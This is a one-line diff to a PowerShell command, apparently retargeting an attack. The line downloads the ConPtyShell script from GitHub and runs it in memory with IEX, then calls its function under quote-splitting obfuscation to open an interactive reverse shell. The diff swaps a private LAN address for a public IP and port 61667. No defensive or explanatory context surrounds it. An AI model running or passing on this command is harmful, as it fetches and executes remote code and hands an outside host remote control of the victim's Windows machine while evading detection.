@@ -1,1 +1,1 @@
-IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); I""nv""oke-Co""nPt""yShe""ll 192.168.43.10 443
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); I""nv""oke-Co""nPt""yShe""ll 193.161.193.99 61667
